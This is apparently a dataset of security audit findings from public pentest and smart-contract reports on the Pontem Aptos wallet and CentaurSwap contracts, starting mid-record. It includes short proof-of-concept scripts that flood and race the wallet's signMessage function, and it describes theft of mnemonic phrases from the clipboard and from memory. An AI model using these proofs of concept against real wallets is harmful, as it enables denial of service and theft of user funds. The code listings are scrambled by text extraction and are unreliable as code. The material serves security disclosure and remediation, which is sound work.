DATA ACCESSIBLE ON THE CLIPBOARD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "The Aptos wallet could allow an attacker to obtain the mnemonic passphrase from the clipboard storage. The attack paths could be considered local A Python script or other process could have access to and remote. the clipboard and obtain this sensitive information. Additionally, a malicious web page with clipboard access could be able to obtain the mnemonic passphrase and send it to the attacker. Evidences: PoC video: Mnemonic phrase leaked from clipboard using python script PoC video: Mnemonic phrase leaked from clipboard using web browser Risk Level: Likelihood - 5 Impact - 5 Recommendation: The export of the public and private key should not be done using the clipboard, which could be accessible from other processes. Additionally, disable the copy functionality of the passphrase. The extension should allow only to read the passphrase. 18 Remediation Plan: PENDING: The Pontem Network team stated that the recommendation will be followed in a future version of the code. Pontem Aptos Wallet may be at risk until the fixes have been reviewed and deployed. 19 ", "labels": ["Halborn", "Pontem_Network_Aptos_Wallet_WebApp_Pentest", "Severity: Critical"]}, {"title": "POTENTIAL MEMORY LEAK ON signMessage", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "Pontem Aptos Wallet allowed an attacker to execute malicious code using the exported wallet functions, triggering a Denial of Service on the extension and the Browser (Chrome v105.0.5195.125). An attacker could use the malicious code to call the wallet (locked and unlocked) to trigger a Denial of Service on the browser, closing the running process. Proof of concept: Listing 1: Exploit window . pontem . signMessage ( ' Signed message ') . then ( result => { console . log (' Signed Message ' , result ) }) . catch ( e => console . log ( ' Error ' , e)) 1 async function sign () { 2 3 4 5 6 7 } 8 9 async function exploitDoS () { 10 11 12 13 } for ( i =0; i < 1000000; i ++) { sign () } Extension Denial-of-Service Browser Denial-of-Service 20 Risk Level: Likelihood - 5 Impact - 5 Recommendation: Improve the management of the calls to the exported functions, and in- troduce mechanisms to control multiple calls and memory in use. Remediation Plan: SOLVED: The issue was solved in the following GitHub Pull Request (Commit 45429fb617843ccfbbab62dec76c77a4001ea73d): Feature apt 643 #113 21 ", "labels": ["Halborn", "Pontem_Network_Aptos_Wallet_WebApp_Pentest", "Severity: Critical"]}, {"title": "RACE CONDITION ON SIGNED MESSAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "The SignMessage exported function allowed an attacker to abuse the func- tion and trigger a race condition state. The function did not control the function execution, allowing to execute multiple calls to the same function in a short period of time. This situation allowed an attacker to overwrite the content of the signed messages. Proof of concept: Listing 2: Exploit . then ( result => { . then ( result = > { console . log ( ' Signed Message ' , result ) }) . catch ( e => console . log ( ' Error ', e)) 1 async function exploitSign () { 2 for (i = 1; i <= 5; i ++) { 3 4 window . pontem . signMessage ( i) 5 6 7 8 9 } 10 11 window . pontem . signMessage ( ' Test1 ') 12 13 14 15 16 17 await new Promise ( r => setTimeout (r , 1000) ) ; 18 19 window . pontem . signMessage ( ' Test2 ') 20 21 22 23 24 } }) . catch ( e => console . log ( ' Error ', e)) }) . catch ( e => console . log ( ' Error ', e)) console . log ( ' Signed Message ' , result ) console . log ( ' Signed Message ' , result ) . then ( result => { 22 Race condition on the signed messages Risk Level: Likelihood - 5 Impact - 5 Recommendation: Implement a method to queue the messages to sign, or an add control inside the function to not execute the same code before finishing the previous one. Remediation Plan: SOLVED: The issue was solved in the following GitHub Pull Request (Commit 45429fb617843ccfbbab62dec76c77a4001ea73d): Feature apt 643 #113 23 ", "labels": ["Halborn", "Pontem_Network_Aptos_Wallet_WebApp_Pentest", "Severity: Critical"]}, {"title": "NO CONFIRMATION REQUIRED ON SIGNING MESSAGES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "The SignMessage exported function allowed an attacker to abuse the func- tion and trigger a race condition state. Additionally, the function did not verify the approval of the user, using a previous cached message on the signing output, and showing to the user the legitimate message to sign. The output of the previous cached message was produced before the approval of the user on the legitimate signing function. Proof of concept: Listing 3: Exploit . then ( result = > { console . log ( ' Signed Message ' , result ) }) . catch ( e => console . log ( ' Error ', e)) 1 async function exploitSign () { 2 for (i = 1; i <= 5; i ++) { 3 4 window . pontem . signMessage ( i) 5 6 7 8 9 } 10 11 window . pontem . signMessage ( ' Test1 ') 12 13 14 15 16 17 await new Promise ( r => setTimeout (r , 1000) ) ; 18 19 window . pontem . signMessage ( ' Test2 ') 20 21 22 }) . catch ( e => console . log ( ' Error ', e)) console . log ( ' Signed Message ' , result ) console . log ( ' Signed Message ' , result ) . then ( result => { . then ( result => { }) 24 . catch ( e => console . log ( ' Error ', e)) 23 24 } No approval verification on signed messages. Risk Level: Likelihood - 5 Impact - 5 Recommendation: Improve the signMessage function to validate if the user approves the signed message and do not allow multiple executions of the function with only one interaction. Remediation Plan: SOLVED: The issue was solved in the following GitHub Pull Request (Commit 45429fb617843ccfbbab62dec76c77a4001ea73d): Feature apt 643 #113 25 ", "labels": ["Halborn", "Pontem_Network_Aptos_Wallet_WebApp_Pentest", "Severity: Critical"]}, {"title": "UNENCRYPTED MNEMONIC PHRASE IN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "The mnemonic phrase in the wallet is not encrypted in memory. As a result, an attacker who has compromised a users machine can exfiltrate and steal their mnemonic phrase. It was further found that this mnemonic phrase stays in memory while the application remains open. This report only contains the vulnerabilities found within the Windows platform. The number of ways to exploit this on Windows were trigger than on Linux and MacOS. If the memory issues are fixed on the Windows platform, they will automatically also cater for those on Linux and MacOS. Proof of concept: The plain text mnemonic phrase is available in memory during various scenarios. Memory dumps were taken throughout the testing process. These memory dumps contained an exact replica of what was in memory while the application was open. Making use of the strings tool on Linux, a search through the memory dump file revealed the plain text mnemonic phrase. Figure 1: Mnemonic phrase leaked from Chrome memory dump 26 Besides that, a mnemonic phrase was also found using Demonic.exe binary that exploits this CVE-2022-32969 discovered few weeks ago by Halborn. See video below. PoC video: (Demonic) Mnemonic phrase leaked from memory using CVE-2022-32969 Risk Level: Likelihood - 5 Impact - 5 Recommendation: The following recommendation was provided:  Clear/dereference values of variables which store mnemonic phrases in your code. This will speed up the garbage collector removing the phrase from memory. It is also important to break up the mnemonic phrase into several variables, or obfuscate the original phrase and then dereferencing the variable which used to hold the original phrase. In the cases where you have to handle the mnemonic phrase, you can use the obfuscated variable along with a function that will reconstruct the original mnemonic phrase at the exact point where it is needed.  Avoid saving the mnemonic phrase on disk, even if it is encrypted. There are cases where you want to identify a wallet, and many times the mnemonic associated with that wallet is retrieved from disk and decrypted. This can result in leakage of the mnemonic in memory. Instead, you should store and use the entropy to identify wallets.  Instead of having the user enter their whole phrase, use word selection for mnemonic phrase confirmation on wallet creation.  Add invisible fake words in-between the mnemonic phrase words when displaying the mnemonic, to hide the phrase in memory. 27 References: Halborn discloses Demonic vulnerability in MetaMask CVE-2022-32969 Remediation Plan: PENDING: The Pontem Network team stated that the recommendation will be followed in a future version of the code. Pontem Aptos Wallet may be at risk until the fixes have been reviewed and deployed. 28 ", "labels": ["Halborn", "Pontem_Network_Aptos_Wallet_WebApp_Pentest", "Severity: Critical"]}, {"title": "UN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "As a The mnemonic phrase in the wallet is not encrypted in memory. result, an attacker who has compromised a users machine can exfiltrate and steal users wallet password. This report only contains the vulnerabilities found within the Windows The number of ways to exploit this on Windows were trigger platform. than on Linux and MacOS. If the memory issues are fixed on the Windows platform, they will automatically also cater for those on Linux and MacOS. Proof of concept: The plain text user password is available in memory during various scenarios. Memory dumps were taken throughout the testing process. These memory dumps contained an exact replica of what was in memory while the application was open. Making use of the strings tool on Linux, a search through the memory dump file revealed the plain text mnemonic phrase. Figure 2: User wallet password leaked from Chrome memory dump Risk Level: Likelihood - 5 Impact - 5 29 Recommendation: Clear/dereference values of variables which store sensitive information in your code. This will speed up the garbage collector removing the data from memory. In the cases where you have to handle the data, you can use the obfuscated variable along with a function that will reconstruct the original data at the exact point where it is needed. Remediation Plan: PENDING: The Pontem Network team stated that the recommendation will be followed in a future version of the code. Pontem Aptos Wallet may be at risk until the fixes have been reviewed and deployed. Several improvements in the passwords encryption were made in the following GitHub Pull Request: [Wallet] APT-757. Encrypt plain text password #297 30 ", "labels": ["Halborn", "Pontem_Network_Aptos_Wallet_WebApp_Pentest", "Severity: Critical"]}, {"title": "ACCOUNT NOT INITIALIZED ON CREATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "New wallets (or new accounts within an existing wallet) were unable to receive funds from other accounts without previously have called faucet. The Node endpoint gave a 404 Not found response when Aptos Wallet tried to identify the new-creation account address. This caused an error message in the browser console, throwing an error message to the user, blocking the transaction. Figure 3: Error message on the transaction to a new created account Note: New Aptos accounts must be initialized, sending Aptos (only Aptos) to it by design. Proof of Concept: PoC video: New account not initialized on creation Risk Level: Likelihood - 4 Impact - 4 Recommendation: Initialize the account or advert the user that the account is not initialized by default on creation. 31 Remediation Plan: SOLVED: The issue was solved in the commit ID: e22322910ad13ea6373d7bb1756f9f821137ea38 According to the Pontem Network team: When a wallet is created using a cryptographic method, this does not mean that this address exists in the blockchain network. As soon as the first transaction using this address is executed (for example, funds are transferred to this address), an account will be automatically created, and this error will no longer occur. This issue was reported due to testing on devnet. Pontem Network stated that in v2.0.0, when someone sends funds to a new account, that account pays gas for creating that recipient account, as there is no faucet on mainnet to reproduce the above-mentioned PoC of this issue. 32 ", "labels": ["Halborn", "Pontem_Network_Aptos_Wallet_WebApp_Pentest", "Severity: High"]}, {"title": "CLEAR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "Hard-coded clear-text credentials were found in the source code. This is considered bad practice and may pose a risk for the application if a malicious user manages to access to some of them. Secrets should be securely stored and shared between the development team on a need to know basis. Additionally, these might be later re-used by someone and should they fall in the wrong hands, they could be used to access sensitive services and data. Code Location: Listing 4: .env.development (Line 3) 1 HTTPS = true 2 BROWSER = none 3 REACT_APP_DEVELOPMENT_VAULT_PASSWORD =123456 4 Risk Level: Likelihood - 2 Impact - 4 Recommendation: All the secrets must be removed from source code in all repositories. Instead, other alternatives for obtaining securely secrets must be used, such as environment variables. This way, environment variables would be passed as arguments to the code, should it be needed. Additionally, it would be recommended that a second person reviewed every Git commits before being pushed to ensure that unintended data is not 33 committed to the repository. References: OWASP. Use of hardcoded passwords CWE-798: Use of Hard-coded Credentials Remediation Plan: The issue SOLVED: 6b1b114f104079ecec717fcca00ad8b485e28666 The Pontem Network team removed clear-text password from source code. following GitHub solved was the in Commit: 34 ", "labels": ["Halborn", "Pontem_Network_Aptos_Wallet_WebApp_Pentest", "Severity: Medium"]}, {"title": "WEAK PASSWORD POLICY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "There was no password policy enforced when user was setting up the password. Weak passwords are considered to be those that are short, employ common words, system/software defaults, or any terms that could be quickly guessed by executing a brute force attack using a subset of all possible passwords, such as dictionary words, proper nouns, username-based words, or common variations on these themes and even company-related. Proof of Concept: It was possible to configure as users password the following values: - 0123456789 - 000000 - aaaaaa - abcdef These values are considered as too weak passwords. Weak password set up during the wallet creation Due to lack of implementation of robust password policy (see the following vulnerabilities), it may be easy for an attacker to brute-force user accounts and compromise them. Risk Level: Likelihood - 4 Impact - 3 35 Recommendation: Enforce a strong password policy. passwords based on dictionary words. It is recommended to implement a strong password policy and have at least 10 minimum characters contains upper case, lower case, numeric and special characters. Do not permit weak passwords or References: CWE-521 OWASP. Testing for weak password policy Password Strength Checker Remediation Plan: RISK ACCEPTED: The Pontem Network team accepted the risk of the issue. 36 3.10 (HAL-10) VULNERABLE DEPENDENCIES - MEDIUM ", "labels": ["Halborn", "Pontem_Network_Aptos_Wallet_WebApp_Pentest", "Severity: Low"]}, {"title": "INFINITE ALLOWANCE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "Setting the allowance value to -1 or MAX UINT 256 on the CentaurLPToken contract will cause the spender to keep performing transfers until a new approval is set on the spender. Code Location: Listing 1: CentaurLPToken.sol (Lines 54) 53 54 55 56 57 58 59 function transferFrom ( address from , address to , uint value ) external returns ( bool ) { if ( allowance [ from ][ msg . sender ] != uint ( -1) ) { allowance [ from ][ msg . sender ] = allowance [ from ][ msg . sender ]. sub ( value ); } _transfer ( from , to , value ); return true ; } Risk Level: Likelihood - 2 Impact - 2 Recommendations: Follow the standard ERC20 practices and allow the user to increase and decrease the approval amount (see increaseApproval and decreaseApproval of StandardToken.sol#L63-L98). If this is not possible, ensure users are aware of this extra functionality Furthermore, it is and encourage them to use it when appropriate. 14 preferable to periodically increase the allowance rather than disabling the allowance feature. Remediation Plan: SOLVED: Centaur team has updated the document regarding this functionality here https://docs.cntr.finance/audits ", "labels": ["Halborn", "CentaurSwap", "Severity: Low"]}, {"title": "INTEGER OVERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "A subtraction underflow may occur when calling transferFrom on the CentaurLPToken contract. For example, if the allowance of the spender is 0, the value will be subtracted from it, causing an underflow. See Figure 1. Integer overflows or underflows occur when the result of an arithmetic operation is outside of the possible range for an integer. If the amount exceeds the maximum or is lower than the minimum represented by the number of bits available, it will result in an incorrect value. Figure 1: Underflow taking place on the transferFrom function in the CentaurLPToken due to allowance being 0. 15 Code Location: Listing 2: CentaurLPToken.sol (Lines 55) 53 54 55 56 57 58 59 function transferFrom ( address from , address to , uint value ) external returns ( bool ) { if ( allowance [ from ][ msg . sender ] != uint ( -1) ) { allowance [ from ][ msg . sender ] = allowance [ from ][ msg . sender ]. sub ( value ); } _transfer ( from , to , value ); return true ; } Risk Level: Likelihood - 2 Impact - 2 Recommendations: Although safe math libraries are used, no message is returned to the caller when the underflow causes the transaction to fail. Returning an error message like \"ERC20: transfer amount exceeds allowance\" would help explain why the transaction failed. Reference: Ethereum Smart Contract Best Practices - Integer Overflow and Underflow Remediation Plan: RISK ACCEPTED: Centaur team accepted this risk since the contracts are already deployed. 16 ", "labels": ["Halborn", "CentaurSwap", "Severity: Low"]}, {"title": "USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The global variable block.timestamp does not necessarily hold the current time, and may not be accurate. Miners can influence the value of block .timestamp to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. Code Location: Listing 3: CentaurSettlement.sol (Lines 65) 60 61 62 63 64 65 66 67 require ( msg . sender == _tPool , ' CentaurSwap : INVALID_POOL '); require ( pendingSettlement [ _sender ][ _fPool ]. settlementTimestamp != 0, ' CentaurSwap : SETTLEMENT_DOES_NOT_EXISTS '); require ( pendingSettlement [ _sender ][ _tPool ]. settlementTimestamp != 0, ' CentaurSwap : SETTLEMENT_DOES_NOT_EXISTS '); require ( block . timestamp >= pendingSettlement [ _sender ][ _fPool ]. settlementTimestamp , ' CentaurSwap : SETTLEMENT_PENDING '); _safeTransfer ( ICentaurPool ( _tPool ). baseToken () , _tPool , pendingSettlement [ _sender ][ _fPool ]. maxAmountOut ); Listing 4: CentaurRouter.sol (Lines 23) 22 23 24 modifier ensure ( uint deadline ) { require ( deadline >= block . timestamp , ' CentaurSwap : EXPIRED '); _ ; 17 Listing 5: CentaurPool.sol (Lines 161) 149 ICentaurSettlement . Settlement memory pendingSettlement = ICentaurSettlement . Settlement ( 150 151 152 153 154 155 156 157 158 159 160 161 162 pool , _amountIn , ICentaurPool ( pool ). baseTokenTargetAmount () , ( ICentaurPool ( pool ). baseTokenBalance () ). sub ( _amountIn ) , ICentaurPool ( pool ). liquidityParameter () , address ( this ) , maxAmount , baseTokenTargetAmount , baseTokenBalance , liquidityParameter , _receiver , block . timestamp . add ( ICentaurSettlement ( settlement ). settlementDuration () ) ); Listing 6: CentaurPool.sol (Lines 201) 199 require ( pendingSettlement . settlementTimestamp != 0 , ' CentaurSwap : NO_PENDING_SETTLEMENT '); 200 require ( pendingSettlement . tPool == address ( this ) , ' CentaurSwap : WRONG_POOL_SETTLEMENT '); 201 require ( block . timestamp >= pendingSettlement . settlementTimestamp , ' CentaurSwap : SETTLEMENT_STILL_PENDING '); Listing 7: CentaurPool.sol (Lines 306) 303 function emergencyWithdraw ( address _token , uint _amount , address _to ) external onlyFactory { _safeTransfer ( _token , _to , _amount ); emit EmergencyWithdraw ( block . timestamp , _token , _amount , _to ); 304 305 306 307 } Recommendation: Use block.number instead of block.timestamp to reduce the risk of MEV attacks. If possible, use an oracle. 18 Remediation Plan: RISK ACCEPTED: Centaur team accepted this risk since the contracts are already deployed. ", "labels": ["Halborn", "CentaurSwap", "Severity: Low"]}, {"title": "FLOATING PRAGMA AND VERSION MISMATCH", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "Deploy Some contracts are using a floating pragma, such as ^0.6.12. contracts with the same compiler version and flags used during development Locking the pragma helps ensure that contracts do not and testing. accidentally get deployed using a different compiler specification. For example, an outdated compiler version might introduce bugs, or a new version that is not extensively tested may introduce security vulnerabilities. Additionally, the contracts are using different versions of the solidity compiler. Listing # 8 shows the versions used. Listing 8: (Lines 1) 1 - Version used : [ '=0.6.12 ' , ' >=0.4.24 <0.8.0 ' , ' >=0.5.0 ' , ' >=0.6.0 ' , ' >=0.6.0 <0.8.0 ' , ' >=0.6.2 ' , ' >=0.6.2 <0.8.0 ' , '^0.5.0||^0.6.0||^0.7.0 ' , '^0.6.12 '] 2 - =0.6.12 ( contracts / CentaurFactory . sol #3) 3 - =0.6.12 ( contracts / CentaurLPToken . sol #3) 4 - =0.6.12 ( contracts / CentaurPool . sol #3) 5 - ABIEncoderV2 ( contracts / CentaurPool . sol #4) 6 - =0.6.12 ( contracts / CentaurRouter . sol #3) 7 - =0.6.12 ( contracts / CentaurSettlement . sol #3) 8 - ABIEncoderV2 ( contracts / CentaurSettlement . sol #4) 9 - >=0.5.0 ( contracts / interfaces / ICentaurFactory . sol #3) 10 - >=0.5.0 ( contracts / interfaces / ICentaurPool . sol #3) 11 - >=0.6.2 ( contracts / interfaces / ICentaurRouter . sol #3) 12 - >=0.5.0 ( contracts / interfaces / ICentaurSettlement . sol #3) 13 - ABIEncoderV2 ( contracts / interfaces / ICentaurSettlement . sol #4) 14 - ^0.6.12 ( contracts / interfaces / ICloneFactory . sol #3) 19 15 - >=0.6.0 <0.8.0 ( contracts / interfaces / IERC20 . sol #3) 16 - ^0.6.12 ( contracts / interfaces / IOracle . sol #3) 17 - >=0.5.0 ( contracts / interfaces / IWETH . sol #3) 18 - ^0.5.0||^0.6.0||^0.7.0 ( contracts / libraries / ABDKMathQuad . sol #6) 19 - ^0.6.12 ( contracts / libraries / CentaurMath . sol #3) 20 - >=0.6.0 <0.8.0 ( contracts / libraries / Context . sol #3) 21 - >=0.4.24 <0.8.0 ( contracts / libraries / Initializable . sol #4) 22 - >=0.6.0 <0.8.0 ( contracts / libraries / Ownable . sol #3) 23 - >=0.6.0 <0.8.0 ( contracts / libraries / SafeMath . sol #3) 24 - >=0.6.0 ( contracts / libraries / TransferHelper . sol #3) Code Location: Listing 9: interfaces/ICloneFactory.sol 3 pragma solidity ^0.6.12; Listing 10: libraries/ABDKMathQuad.sol 6 pragma solidity ^0.5.0 || ^0.6.0 || ^0.7.0; Listing 11: interfaces/IOracle.sol 3 pragma solidity ^0.6.12; Listing 12: libraries/CentaurMath.sol 3 pragma solidity ^0.6.12; Listing 13: helpers/CloneFactory.sol 3 pragma solidity ^0.6.12; Risk Level: Likelihood - 1 20 Impact - 3 Recommendations: Lock the pragma version whenever possible and avoid using a floating pragma in the final deployment. The pragma can be locked in the code by removing the caret () and by specifying the exact version in the Truffle configuration file truffle-config.js or hardhat.config.js if using the HardHat framework. Remediation Plan: RISK ACCEPTED: Centaur team accepted this risk since the contracts are already deployed. ", "labels": ["Halborn", "CentaurSwap", "Severity: Low"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "Public functions consume more gas than those declared as external. The EVM passes the arguments of a public function via pointers, which require the array to be in memory. There is no such requirement for external functions. Choosing the incorrect modifier can inflate the needed gas. As explained by the Solidity Documentation:  External functions ... can be called from other contracts and via transactions. An external function cannot be called internally  Public functions ... can be either called internally or via messages.  Internal functions ... can only be accessed internally (i.e. from within the current contract or contracts deriving from it)  Private functions ... are only visible for the contract they are defined in and not in derived contracts. 21 Code Location: Listing 14: WheyFarm.sol 92 93 94 95 96 function add ( uint256 _allocPoint , IERC20 _lpToken , bool _withUpdate ) public onlyOwner { Listing 15: WheyFarm.sol 127 128 129 130 131 function set ( uint256 _pid , uint256 _allocPoint , bool _withUpdate ) public onlyOwner { Listing 16: WheyFarm.sol 261 function deposit ( uint256 _pid , uint256 _amount ) public { Listing 17: WheyFarm.sol 288 function withdraw ( uint256 _pid , uint256 _amount ) public { Listing 18: WheyFarm.sol 308 function harvestAll () public { Listing 19: WheyFarm.sol 327 function emergencyWithdraw ( uint256 _pid ) public { Listing 20: WheyFarm.sol 346 function updateDev ( address _devaddr ) onlyOwner public { 22 Listing 21: WheyToken.sol 10 function mint ( address _to , uint256 _amount ) public onlyOwner { Recommendation: If appropriate, declare the functions as external instead of public. A best practice is to use external if expecting a function only to be called externally, public if called internally and externally, and private or internal if only used inside the contract. Public functions are always accessible, but external functions are only available to outside callers. Remediation Plan: RISK ACCEPTED: Centaur team accepted this risk since the contracts are already deployed. ", "labels": ["Halborn", "CentaurSwap", "Severity: Informational"]}, {"title": "FUNCTION REDEFINITION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "function _safeTransfer The and CentaurSettlement. Other contracts are using the declared safeTransfer on the TransferHelper library contract. re-declared CentaurPool in is Code Location: Listing 22: CentaurPool.sol 94 function _safeTransfer ( address token , address to , uint value ) private { ( bool success , bytes memory data ) = token . call ( abi . 95 encodeWithSelector ( SELECTOR , to , value )) ; 23 96 require ( success && ( data . length == 0 || abi . decode ( data , ( bool ))) , ' CentaurSwap : TRANSFER_FAILED '); 97 } Listing 23: CentaurSettlement.sol 33 function _safeTransfer ( address token , address to , uint value ) private { ( bool success , bytes memory data ) = token . call ( abi . encodeWithSelector ( SELECTOR , to , value )) ; require ( success && ( data . length == 0 || abi . decode ( data , ( bool ))) , ' CentaurSwap : TRANSFER_FAILED '); 34 35 36 } Recommendation: Apply library usage consistently to avoid security issues. If using a library for transfers, it is better to use it everywhere. Patching will only have to be done for one instance rather than multiple if updates are required. Remediation Plan: RISK ACCEPTED: Centaur team accepted this risk since the contracts are already deployed. ", "labels": ["Halborn", "CentaurSwap", "Severity: Informational"]}, {"title": "USER CONTROLLED REQUIRE COMPARISON", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "variable _minLiquidity of the The The user can CentaurRouter contract is used in a require comparison. control both ends of the require comparison. For example, setting the _minLiquidity value to 0 would allow a user to bypass the require check addLiquidity function the in 24 and allow adding any amount of liquidity. Code Location: Listing 24: CentaurRouter.sol (Lines 84) 70 function addLiquidity ( 71 72 73 74 75 76 ) external virtual override ensure ( _deadline ) onlyEOA ( msg . sender ) address _baseToken , uint _amount , address _to , uint _minLiquidity , uint _deadline returns ( uint amount , uint liquidity ) { address pool = ICentaurFactory ( factory ). getPool ( _baseToken ); require ( pool != address (0) , ' CentaurSwap : POOL_NOT_FOUND '); ( liquidity ) = _addLiquidity ( _baseToken , _amount , _minLiquidity ); TransferHelper . safeTransferFrom ( _baseToken , msg . sender , pool , _amount ); liquidity = ICentaurPool ( pool ). mint ( _to ); require ( liquidity > _minLiquidity , ' CentaurSwap : INSUFFICIENT_OUTPUT_AMOUNT '); return ( _amount , liquidity ); 77 78 79 80 81 82 83 84 85 86 87 } Listing 25: CentaurRouter.sol (Lines 67) 50 function _addLiquidity ( address _baseToken , 51 uint _amount , 52 53 uint _minLiquidity 54 ) internal view virtual returns ( uint liquidity ) { 55 ICentaurPool pool = ICentaurPool ( ICentaurFactory ( factory ). getPool ( _baseToken )) ; 56 57 58 59 60 uint _totalSupply = pool . totalSupply () ; uint _baseTokenTargetAmount = pool . baseTokenTargetAmount () ; liquidity = _amount ; 25 if ( _totalSupply == 0) { liquidity = _amount . add ( _baseTokenTargetAmount ); } else { liquidity = _amount . mul ( _totalSupply ). div ( _baseTokenTargetAmount ); } require ( liquidity > _minLiquidity , ' CentaurSwap : INSUFFICIENT_OUTPUT_AMOUNT '); 61 62 63 64 65 66 67 68 } Recommendation: Add the minimum liquidity amount during the construction of the pool. If this value needs to be changed later, adding a setter would allow It is not a good practice to use user-controlled updating its value. parameters for assertion checks in the code. Remediation Plan: Centaur this regarding document has SOLVED: functionality here https://docs.cntr.finance/audits. _minLiquidity is used for slippage tolerance therefore should be modifiable by the user. updated team the ", "labels": ["Halborn", "CentaurSwap", "Severity: Informational"]}, {"title": "MISSING VARIABLE CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The value _allocPoint provided as argument on the add function in WheyFarm is not checked for being bigger than 0. Setting a totalAllocPoint of 0 causes division-by-zero errors as shown in Figure 13. 26 . Code Location: Listing 26: WheyFarm.sol (Lines 102) 92 function add ( uint256 _allocPoint , 93 IERC20 _lpToken , 94 95 bool _withUpdate 96 ) public onlyOwner { 97 98 99 100 101 102 if ( _withUpdate ) { massUpdatePools () ; } uint256 lastRewardBlock = block . number > startBlock ? block . number : startBlock ; totalAllocPoint = totalAllocPoint . add ( _allocPoint ); Listing 27: WheyFarm.sol (Lines 188) 186 if ( block . number > pool . lastRewardBlock && lpSupply != 0) { 187 uint256 wheyReward = getWheyReward ( pool . nextEmissionIndex , pool . lastRewardBlock , block . number ); 188 uint256 poolWheyReward = wheyReward . mul ( pool . allocPoint ). div ( totalAllocPoint ); 189 190 191 192 193 } accWheyPerShare = accWheyPerShare . add ( ( poolWheyReward . mul (85) . div (100) ). mul (1 e12 ). div ( lpSupply ) ); 27 Recommendation: Perform boundary checks on user/admin supplied values to address possible issues. Remediation Plan: RISK ACCEPTED: Centaur team accepted this risk since the contracts are already deployed. 28 MANUAL TESTING 29 During the manual testing multiple questions where considered while evaluation each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Can somehow an external controlled contract call again the function during the execution of it? (Re-entrancy)  Can it be called twice in the same block and cause issues?  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation . . .  Are the function parameters and variables controlled by external contracts?  Can extended contracts cause issues on the extender contract? 4.1 CentaurFactory Attempting to add an empty pool does require the token address to be non-zero, ensuring that the pool was initialized as shown in Figure 2. G N I T S E T L A U N A M Figure 2: Adding an empty pool on the Factory checks Initializing a pool with a custom base token and later adding it to the factory is allowed as expected as seen in Figure 3. Re-adding to the pool checks shown in Figure 4. Removing the pool and trying double remove, shown in Figure 5. Creating a pool using exported methods, shown in Figure 6. 30 Figure 3: Initializing the pool and adding it to the factory Figure 4: Trying to re-add the pool to the factory G N I T S E T L A U N A M Figure 5: Trying to double remove the pool 31 Figure 6: Creating a pool using methods 4.2 CentaurPool The internal function named _safeTransfer duplicates the safeTransfer function in TransferHelper. Re-initializing the factory causes errors, as shown in Figure 7. Figure 7: Factory re-initialization checks Some functions are required to be called from the Router: G N I T S E T L A U N A M  mint  burn  swapFrom  swapTo Functions allowed by the Factory:  setFactory 32  setTradeEnabled  setDepositEnabled  setWithdrawEnabled  setLiquidityParameter  emergencyWithdraw No requirement from the caller:  swapSettle  mint assumes that the balance increase is a result of the addLiquidity call from the Router:  baseTokenBalance keeps track of the previous balance value, it subtracts to the current balanceOf base token. Test showcasing that if funds are transferred the next account gets accredited the minted tokens is shown in Figure 8 and Figure 9. When swapping tokens CentaurMath is calculating the difference of surplus and demand using the function shown in their documentation https://docs. cntr.finance/centaur-swap/cross-pair-swaps??. G N I T S E T L A U N A M 33 Figure 8: Test case that demonstrated that manually transferred funds to the pool get minted by the following user adding liquidity G N I T S E T L A U N A M Figure 9: Result of the testcase on the console 34 4.3 CentaurRouter The removeLiquidity does not work if the client does not approve the router from spending the underlying CentaurLPTokens, furthermore the subtraction overflow is shown indicating that the transferFrom function is missing to subtract the allowance. Figure 10: Subtraction overflow on the allowance due to invalid checks. Missing throw error description Anti-contract call 